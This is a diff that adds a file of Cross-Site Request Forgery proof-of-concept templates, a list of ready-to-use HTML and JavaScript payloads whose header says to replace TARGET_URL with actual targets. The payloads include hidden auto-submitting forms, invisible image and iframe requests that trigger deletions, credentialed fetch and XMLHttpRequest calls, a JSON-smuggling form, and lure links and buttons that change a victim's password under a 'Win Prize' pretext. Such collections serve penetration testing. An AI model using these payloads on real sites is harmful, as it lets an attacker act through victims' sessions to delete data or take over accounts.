@@ -1,0 +1,14 @@
+# CSRF - Proof of Concept Templates
+# HTML templates for Cross-Site Request Forgery attacks
+# Replace TARGET_URL and PARAM values with actual targets
+<form action="TARGET_URL" method="POST"><input type="hidden" name="param" value="evil"><input type="submit" value="Submit"></form>
+<form action="TARGET_URL" method="POST" id="csrf"><input type="hidden" name="param" value="evil"></form><script>document.getElementById('csrf').submit();</script>
+<img src="TARGET_URL?action=delete&id=1" style="display:none">
+<iframe src="TARGET_URL?action=delete&id=1" style="display:none"></iframe>
+<script>fetch('TARGET_URL',{method:'POST',body:'param=evil',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>
+<script>var x=new XMLHttpRequest();x.open('POST','TARGET_URL',true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.withCredentials=true;x.send('param=evil');</script>
+<form action="TARGET_URL" method="POST" enctype="text/plain"><input name='{"param":"evil","ignore":"' value='"}' type="hidden"><input type="submit"></form>
+<body onload="document.forms[0].submit()"><form action="TARGET_URL" method="POST"><input type="hidden" name="param" value="evil"></form></body>
+<a href="TARGET_URL?action=delete&id=1">Click here for free prize!</a>
+<form action="TARGET_URL" method="POST"><input type="hidden" name="password" value="hacked"><input type="hidden" name="confirm_password" value="hacked"><input type="submit" value="Win Prize"></form>
+<script>var img=new Image();img.src='TARGET_URL?action=delete&id=1';</script>
